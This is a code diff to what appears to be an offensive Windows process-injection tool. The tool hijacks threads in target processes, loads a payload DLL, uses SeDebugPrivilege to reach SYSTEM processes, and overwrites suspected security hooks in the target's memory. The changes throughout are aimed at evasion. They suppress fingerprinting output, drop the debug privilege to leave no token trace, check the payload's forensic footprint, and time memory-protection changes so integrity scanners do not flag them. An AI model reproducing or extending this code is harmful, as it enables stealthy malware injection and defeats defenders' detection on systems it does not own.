@@ -524,6 +524,24 @@ namespace
     // donor-owner opens) can target SYSTEM processes. The runtime enables it
     // again in-process; doing it here first wins the race at detection time.
     // Returns true when the privilege is confirmed enabled.
+    // Console output is a fingerprint. Anything printed here can end up in a
+    // captured log, a scrollback buffer, or a screenshot, and the combination
+    // of target name, payload path and payload digest identifies both the tool
+    // and the exact build. The identifying detail is therefore suppressed by
+    // default and restored only on request with AMEGER_VERBOSE=1. Declared here,
+    // ahead of its first use, because it is called from both the banner and the
+    // report stages.
+    bool VerboseOutputEnabled()
+    {
+        static const bool verbose = []() -> bool
+        {
+            wchar_t buffer[8] = {};
+            const DWORD got = GetEnvironmentVariableW(L"AMEGER_VERBOSE", buffer, 4);
+            return (got == 1 && buffer[0] == L'1');
+        }();
+        return verbose;
+    }
+
     bool EnableSeDebugPrivilege()
     {
         HANDLE token = nullptr;
@@ -553,6 +571,35 @@ namespace
         // function, so the whole body is protected.
         const DWORD status = GetLastError();
         return status == ERROR_SUCCESS;
+    }
+
+    // Counterpart to EnableSeDebugPrivilege. An enabled SeDebugPrivilege is
+    // durable token state that survives on this process for its whole lifetime
+    // and is visible to anything that inspects our token, so the privilege is
+    // dropped again as soon as the fallback open has been attempted. Dropping
+    // it cannot invalidate handles already obtained.
+    void DisableSeDebugPrivilege()
+    {
+        HANDLE token = nullptr;
+        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
+        {
+            return;
+        }
+        FileHandleGuard tokenGuard(token);
+
+        LUID luid{};
+        if (!LookupPrivilegeValueW(nullptr, SE_DEBUG_NAME, &luid))
+        {
+            return;
+        }
+
+        TOKEN_PRIVILEGES privileges{};
+        privileges.PrivilegeCount = 1;
+        privileges.Privileges[0].Luid = luid;
+        // SE_PRIVILEGE_REMOVED, not just clearing SE_PRIVILEGE_ENABLED, so the
+        // privilege leaves the token rather than lingering disabled-but-held.
+        privileges.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;
+        AdjustTokenPrivileges(token, FALSE, &privileges, sizeof(privileges), nullptr, nullptr);
     }
 
     // Minimal SystemProcessInformation view: only the fields the victim
@@ -1402,7 +1449,7 @@ namespace
 
         if (runtime.get_last_hijack_stats)
         {
-            wprintf(L"%ls[+]%ls Telemetry export found.\n\n", kGreen, kReset);
+            if (VerboseOutputEnabled()) { wprintf(L"%ls[+]%ls Telemetry export found.\n\n", kGreen, kReset); }
 
         }
         else
@@ -1953,7 +2000,7 @@ namespace
                 continue;
             }
 
-            wprintf(L"Verified SHA-256: %ls%ls%ls\n", kGreen, sha256.c_str(), kReset);
+            if (VerboseOutputEnabled()) { wprintf(L"Verified SHA-256: %ls%ls%ls\n", kGreen, sha256.c_str(), kReset); }
             return true;
         }
     }
@@ -2630,27 +2677,35 @@ namespace
 
             if (import_count > 0)
             {
-                wprintf(L" %ls[+]%ls %ls%d%ls import descriptor(s), %ls%lu%ls function(s) total:\n\n",
+                wprintf(L" %ls[+]%ls %ls%d%ls import descriptor(s), %ls%lu%ls function(s) total.\n",
                     kGreen, kReset, kGreen, import_count, kReset, kGreen,
                     static_cast<unsigned long>(import_total_thunks), kReset);
-                for (int i = 0; i < import_count; ++i)
+                // The per-module breakdown names every imported DLL and its
+                // thunk count. That is the single most identifying thing this
+                // tool prints, so it is verbose-only: the summary above still
+                // proves the import table resolved.
+                if (VerboseOutputEnabled())
                 {
-                    const char * raw = imports[i].name;
-                    wchar_t wide[MAX_PATH + 1]{ 0 };
-                    const int wide_len = MultiByteToWideChar(CP_ACP, 0, raw, -1, wide, MAX_PATH + 1);
-                    if (wide_len <= 0)
+                    wprintf(L"\n");
+                    for (int i = 0; i < import_count; ++i)
                     {
-                        wcscpy_s(wide, L"<unprintable>");
+                        const char * raw = imports[i].name;
+                        wchar_t wide[MAX_PATH + 1]{ 0 };
+                        const int wide_len = MultiByteToWideChar(CP_ACP, 0, raw, -1, wide, MAX_PATH + 1);
+                        if (wide_len <= 0)
+                        {
+                            wcscpy_s(wide, L"<unprintable>");
+                        }
+                        // Dotted fields, same as the acquisition trace, so the
+                        // ordinals and module names align on the thunk counts
+                        // instead of relying on a hand-tuned %-40ls pad.
+                        wchar_t ordinal[8]{ 0 };
+                        swprintf_s(ordinal, L"%d.", i + 1);
+                        wprintf(L"      %ls%ls%ls%lu%ls thunk(s)\n",
+                            StageField(ordinal, 6).c_str(),
+                            StageField(wide, 26).c_str(),
+                            kGreen, static_cast<unsigned long>(imports[i].thunk_count), kReset);
                     }
-                    // Dotted fields, same as the acquisition trace, so the
-                    // ordinals and module names align on the thunk counts
-                    // instead of relying on a hand-tuned %-40ls pad.
-                    wchar_t ordinal[8]{ 0 };
-                    swprintf_s(ordinal, L"%d.", i + 1);
-                    wprintf(L"      %ls%ls%ls%lu%ls thunk(s)\n",
-                        StageField(ordinal, 6).c_str(),
-                        StageField(wide, 26).c_str(),
-                        kGreen, static_cast<unsigned long>(imports[i].thunk_count), kReset);
                 }
             }
             else
@@ -3235,13 +3290,13 @@ namespace
                 // can be removed from a VAD walk with a single operation.
                 {
                     const bool single = wx_alloc_bases.size() == 1;
-                    wprintf(L"      %lsallocations%s: %ls%zu%s %s(%s%s%s)%s | %lsprivate%s: %ls%zu%s KB\n",
+                    wprintf(L"      %lsallocations%s: %ls%zu%s %s(%s %s%s)%s | %lsprivate%s: %ls%zu%s KB\n",
                         kDim, kReset,
                         kGreen, wx_alloc_bases.size(), kReset,
                         single ? kGreen : kYellow,
                         single ? L"single" : L"split across",
-                        single ? kGreen : kYellow,
                         single ? L"allocation" : L"allocations",
+                        single ? kGreen : kYellow,
                         kReset,
                         kDim, kReset,
                         kGreen, static_cast<size_t>(wx_bytes / 1024), kReset);
@@ -3581,16 +3636,26 @@ namespace
             }
             else
             {
-                wprintf(L"  %ls[+]%ls Export names: %ls%zu%ls neutral, %ls%zu%ls foreign\n",
-                    kGreen, kReset, kGreen, export_neutral, kReset, kGreen, export_foreign, kReset);
-                wprintf(L"  %ls[+]%ls Standard section names remaining: %ls%zu%ls\n",
-                    kGreen, kReset, kGreen, standard_sections, kReset);
-                wprintf(L"  %ls[+]%ls Debug directory size: %ls0x%lX%ls\n",
-                    kGreen, kReset, kGreen, static_cast<unsigned long>(debug_size), kReset);
+                // Only the verdict is printed by default. The individual
+                // counts are diagnostic detail, and an export-name census plus
+                // a section census is a precise description of this build.
+                if (VerboseOutputEnabled())
+                {
+                    wprintf(L"  %ls[+]%ls Export names: %ls%zu%ls neutral, %ls%zu%ls foreign\n",
+                        kGreen, kReset, kGreen, export_neutral, kReset, kGreen, export_foreign, kReset);
+                    wprintf(L"  %ls[+]%ls Standard section names remaining: %ls%zu%ls\n",
+                        kGreen, kReset, kGreen, standard_sections, kReset);
+                    wprintf(L"  %ls[+]%ls Debug directory size: %ls0x%lX%ls\n",
+                        kGreen, kReset, kGreen, static_cast<unsigned long>(debug_size), kReset);
+                }
                 if (export_foreign || standard_sections || debug_size)
                 {
                     wprintf(L"  %ls[x]%ls Forensic posture regressed; rebuild with mutation enabled.\n", kRed, kReset);
                     posture_ok = false;
+                }
+                else if (!VerboseOutputEnabled())
+                {
+                    wprintf(L"  %ls[+]%ls Forensic posture clean (detail suppressed; set AMEGER_VERBOSE=1).\n", kGreen, kReset);
                 }
             }
 
@@ -3670,12 +3735,22 @@ namespace
                     }
                 }
 
-                wprintf(L"  %ls[+]%ls Payload export names: %ls%zu%ls | standard sections: %ls%zu%ls | RWX sections: %ls%zu%ls | debug: %ls0x%lX%ls\n",
-                    kGreen, kReset,
-                    kGreen, payload_exports, kReset,
-                    kGreen, payload_standard_sections, kReset,
-                    kGreen, payload_rwx_sections, kReset,
-                    kGreen, static_cast<unsigned long>(payload_debug), kReset);
+// The payload's on-disk census. Reporting it by default hands an observer a
+        // complete description of the shipped binary, so only the verdict is
+        // printed unless verbose output is requested.
+        if (VerboseOutputEnabled())
+        {
+            wprintf(L"  %ls[+]%ls Payload export names: %ls%zu%ls | standard sections: %ls%zu%ls | RWX sections: %ls%zu%ls | debug: %ls0x%lX%ls\n",
+                kGreen, kReset,
+                kGreen, payload_exports, kReset,
+                kGreen, payload_standard_sections, kReset,
+                kGreen, payload_rwx_sections, kReset,
+                kGreen, static_cast<unsigned long>(payload_debug), kReset);
+        }
+        else if (payload_ok)
+        {
+            wprintf(L"  %ls[+]%ls Payload on-disk posture clean (detail suppressed; set AMEGER_VERBOSE=1).\n", kGreen, kReset);
+        }
 
                 if (!payload_ok)
                 {
@@ -4347,11 +4422,38 @@ namespace
         bool scanned = false; // 0 when there was no process handle
     };
 
+    // Hook restoring rewrites executable code inside the target, so it is
+    // treated as a dangerous capability rather than a normal toggle: it stays
+    // inert unless the operator sets AMEGER_ALLOW_HOOK_PATCH=1 in the
+    // environment of this process. HookRestore=Y alone is not sufficient.
+    bool HookPatchExplicitlyAllowed()
+    {
+        static const bool allowed = []() -> bool
+        {
+            wchar_t buffer[8] = {};
+            const DWORD got = GetEnvironmentVariableW(L"AMEGER_ALLOW_HOOK_PATCH", buffer, 4);
+            return (got == 1 && buffer[0] == L'1');
+        }();
+        return allowed;
+    }
+
     void ScanAndRestoreHooks(HANDLE process, std::vector<RestoredHook> & restored, std::vector<std::wstring> & remaining, HookScanStats & stats)
     {
         restored.clear();
         remaining.clear();
         stats = HookScanStats{};
+
+        // Hard gate. This path WRITES executable code in the target. That is a
+        // categorically different act from reading it: a target that integrity-
+        // hashes its own text sees the bytes change, and the write also forces
+        // PROCESS_VM_WRITE onto the target handle for the duration. It therefore
+        // requires BOTH the config flag and an explicit environment override,
+        // so it can never be switched on by config alone.
+        if (!HookPatchExplicitlyAllowed())
+        {
+            stats.skipped = stats.targets;
+            return;
+        }
 
         // Survey list is heap-owned, built once from XOR literals above.
         const std::vector<HookTarget> & targets = GetHookTargets();
@@ -4389,27 +4491,56 @@ namespace
                 continue;
             }
 
-            DWORD old_protection = 0;
-            if (!VirtualProtectEx(process, reinterpret_cast<void *>(remote_function), sizeof(local_bytes), PAGE_EXECUTE_READWRITE, &old_protection))
+            // Learn the current protection, then stage the page as writable but
+            // NOT executable for the write. Using PAGE_EXECUTE_READWRITE would
+            // make the page simultaneously writable and executable, which is
+            // precisely the anomaly the W^X audit reports as a failure and what
+            // an in-memory integrity scanner looks for. Two transitions
+            // (X -> RW, then RW -> X) keep W^X true at every instant.
+            MEMORY_BASIC_INFORMATION patch_mbi{};
+            if (!VirtualQueryEx(process, reinterpret_cast<void *>(remote_function), &patch_mbi, sizeof(patch_mbi)))
+            {
+                ++stats.skipped;
+                continue;
+            }
+
+            const DWORD original_protection =
+                patch_mbi.Protect & ~(PAGE_GUARD | PAGE_NOCACHE | PAGE_WRITECOMBINE);
+
+            // Every branch drops the execute bit, including an already-RWX
+            // region, so the write window is never writable+executable.
+            DWORD staged_protection = PAGE_READWRITE;
+            if (original_protection == PAGE_WRITECOPY || original_protection == PAGE_EXECUTE_WRITECOPY)
+            {
+                staged_protection = PAGE_WRITECOPY;
+            }
+
+            DWORD discard_protection = 0;
+            if (!VirtualProtectEx(process, reinterpret_cast<void *>(remote_function), sizeof(local_bytes), staged_protection, &discard_protection))
             {
                 ++stats.skipped;
                 continue;
             }
 
             SIZE_T bytes_written = 0;
-            const bool restored_ok = WriteProcessMemory(process, reinterpret_cast<void *>(remote_function), local_bytes, sizeof(local_bytes), &bytes_written) &&
+            const bool write_ok =
+                WriteProcessMemory(process, reinterpret_cast<void *>(remote_function), local_bytes, sizeof(local_bytes), &bytes_written) &&
                 bytes_written == sizeof(local_bytes);
 
-            FlushInstructionCache(process, reinterpret_cast<void *>(remote_function), sizeof(local_bytes));
-
+            // Always restore the original protection, including when the write
+            // failed, so a partial patch can never leave the page writable.
             DWORD ignored_protection = 0;
-            const bool protection_ok = VirtualProtectEx(process, reinterpret_cast<void *>(remote_function), sizeof(local_bytes), old_protection, &ignored_protection) != FALSE;
+            const bool protection_ok =
+                VirtualProtectEx(process, reinterpret_cast<void *>(remote_function), sizeof(local_bytes), original_protection, &ignored_protection) != FALSE;
 
-            if (!restored_ok || !protection_ok)
+            if (!write_ok || !protection_ok)
             {
                 ++stats.skipped;
                 continue;
             }
+
+            // Flush after the final protection is in place, not before it.
+            FlushInstructionCache(process, reinterpret_cast<void *>(remote_function), sizeof(local_bytes));
 
             BYTE verify_bytes[kHookScanBytes]{};
             SIZE_T bytes_verified = 0;
@@ -4758,7 +4889,7 @@ namespace
         wprintf(L"\n");
         wprintf(L"Target: %ls%ls%ls | Timeout: %ls%d%ls ms\n",
             kGreen, config.target_name.c_str(), kReset, kGreen, config.timeout, kReset);
-        wprintf(L"Load flags: %ls0x%08X%ls\n", kGreen, BuildFlags(config), kReset);
+        if (VerboseOutputEnabled()) { wprintf(L"Load flags: %ls0x%08X%ls\n", kGreen, BuildFlags(config), kReset); }
 
         // Fixed order: prompt for the payload BEFORE waiting for the target.
         // The old order (wait for target -> prompt for DLL -> inject) left a
@@ -4894,6 +5025,10 @@ namespace
                 {
                     sponsorRaw = OpenProcess(Context.SponsorAccess, FALSE, target.pid);
                 }
+                // Revoke immediately: the privilege is only needed for this one
+                // open, and leaving it enabled is a lasting, enumerable trace on
+                // our own token.
+                DisableSeDebugPrivilege();
             }
             DWORD sponsor_err = ERROR_SUCCESS;
             if (!sponsorRaw)
@@ -4988,7 +5123,7 @@ namespace
             // requested only when HookRestore can actually write; otherwise
             // this fallback handle carries the quietest usable mask.
             DWORD scan_mask = PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ;
-            if (config.hook_restore)
+            if (config.hook_restore && HookPatchExplicitlyAllowed())
             {
                 scan_mask |= PROCESS_VM_WRITE | PROCESS_VM_OPERATION;
             }
@@ -5052,9 +5187,15 @@ namespace
         // for the whole timeout when the payload hangs, so name the victim
         // thread and the wait budget before the silence starts. Flush left;
         // the measured TID and timeout are tinted green.
+        // This TID is the thread that was REQUESTED, not necessarily the one that ends
+        // up hijacked: the donor scan may select a different thread entirely.
+        // Printing it as "the" working thread is what previously made a
+        // successful run look inconsistent, because the authoritative hijacked
+        // TID is only known once telemetry reports it at the end. The hijack may
+        // also resume the requested thread untouched if no donor is found.
         if (data.TargetTid)
         {
-            wprintf(L"Working (TID %ls0x%04lX%s, Timeout %ls%lu ms%s)...\n",
+            wprintf(L"Requested TID %ls0x%04lX%s, Timeout %ls%lu ms%s (hijacked thread reported on completion)...\n",
                 kGreen, static_cast<unsigned long>(data.TargetTid), kReset,
                 kGreen, static_cast<unsigned long>(data.Timeout), kReset);
         }
